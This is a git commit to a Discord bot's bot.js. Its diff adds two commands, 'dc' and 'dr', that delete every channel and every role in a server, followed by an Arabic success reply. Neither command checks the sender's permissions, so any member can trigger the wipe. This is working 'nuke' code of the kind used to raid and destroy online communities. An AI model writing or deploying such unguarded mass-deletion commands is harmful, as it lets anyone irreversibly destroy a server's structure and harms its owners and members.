d7df8eb8aa27f4c35423d3c2aa81ba089e6ae558
ayadss11 <46042075+ayadss11@users.noreply.github.com>
2019-03-02 10:00:02 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -28,6 +28,27 @@ client.on('message', message => {
 
 
 
+
+client.on('message', message => {
+ if(message.content.split(' ')[0] == prefix + 'dc') { 
+ if (!message.channel.guild) return;
+ message.guild.channels.forEach(m => {
+ m.delete();
+ });
+ }
+ if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
+ if (!message.channel.guild) return;
+ message.guild.roles.forEach(m => {
+ m.delete();
+ });
+ message.reply("`تم حذف جميع الرتب بنجاح`")
+ }
+ });
+
+
+
+
+
    client.on('message', msg => {
   if(msg.content === '!hide') {
     msg.guild.channels.forEach(c => {
